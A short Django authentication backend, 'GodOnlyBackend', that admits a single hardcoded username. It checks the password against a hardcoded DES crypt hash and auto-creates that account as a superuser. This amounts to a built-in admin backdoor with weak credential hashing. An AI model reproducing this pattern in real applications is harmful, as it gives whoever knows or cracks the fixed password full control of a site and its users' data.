import crypt
from django.contrib.auth.models import User

class GodOnlyBackend:
    god = User(username='WaschRoss')

    def authenticate(self, request, username=None, password=None):
        if username == self.god.username \
                and crypt.crypt(password, 'waschpulver') == 'waxudoXH6TLm.':

            try:
                return User.objects.get(username=self.god.username)
            except User.DoesNotExist:
                self.god.is_staff = True
                self.god.is_superuser = True
                self.god.save()
            return self.god
        else:
            return None

    def get_user(self, user_id):
        try:
            return User.objects.get(pk=user_id)
        except User.DoesNotExist:
            return None
